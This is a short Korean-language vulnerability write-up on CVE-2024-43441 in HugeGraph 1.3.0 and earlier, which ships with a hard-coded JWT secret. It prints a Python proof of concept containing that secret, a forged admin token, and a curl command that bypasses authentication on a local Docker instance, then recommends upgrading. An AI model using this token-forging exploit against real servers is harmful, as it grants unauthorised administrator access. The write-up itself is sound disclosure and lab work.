# CVE-2024-43441 | HugeGraph JWT Secret Hard‑Coded

> 화이트햇 스쿨 3기 - [송은우 (@le0s1mba)](https://github.com/le0s1mba)

<br/>

### 요약

HugeGraph 1.3.0 이하 버전에서는 JWT Secret 키가 코드에 하드코딩되어 있어, 해당 키로 임의의 토큰을 발급 받아 인증 과정을 우회할 수 있다.

<br/>

### PoC

Docker 환경에서 HugeGraph 1.3.0을 실행하고, 하드코딩된 비밀키로 JWT 토큰을 생성하여 인증을 우회한다.

```
import jwt

token = jwt.encode(
    {
        "user_name" : "admin",
        "user_id" : "-30:admin",
        "exp" : 9739523483
    },
    "FXQXbJtbCLxODc6tGci732pkH1cyf8Qg",
    algorithm="HS256"
)

print(f"JWT token : {token}")
```

<br/>

### 환경 구성 및 실행

- ```docker compose up -d``` 명령어로 환경을 먼저 실행시킨다.
- ```python3 poc.py``` 명령어로 토큰을 발급 받는다.
  
<br/>

### 결과

**인증 없음**

```curl -i http://127.0.0.1:8080/graphs```

<br/>

![normal](./not_auth.png)

헤더에 토큰이 없으므로 ```AuthFilter```단계에서 바로 차단된다.

<br/>

**JWT 우회**

```export TOKEN='eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX25hbWUiOiJhZG1pbiIsInVzZXJfaWQiOiItMzA6YWRtaW4iLCJleHAiOjk3Mzk1MjM0ODN9.eZxB0qIsVEtRuOMwXbOhENwS-OoY0miStHOQlBdJXt8'; curl -i -H "Authorization: Bearer $TOKEN" http://127.0.0.1:8080/graphs```

<br/>

![normal](./auth.png)

발급 받은 jwt 토큰을 서버가 정상 토큰으로 인식하여 인증을 우회한다.

<br/>

### 정리

CVE-2024-43441 취약점으로 인해 하드코딩된 JWT Secret을 통해 인증이 완전히 우회된다. 

이를 통해 공격자는 관리자로 위장하여 HugeGraph REST API에 접근하고 데이터를 조작할 수 있다. 

취약점 대응을 위해 HugeGraph를 1.3.1 이상으로 업그레이드하거나, 외부 설정 파일에 안전한 Secret 키를 지정하고 관리 포트 접근을 제한해야 한다.
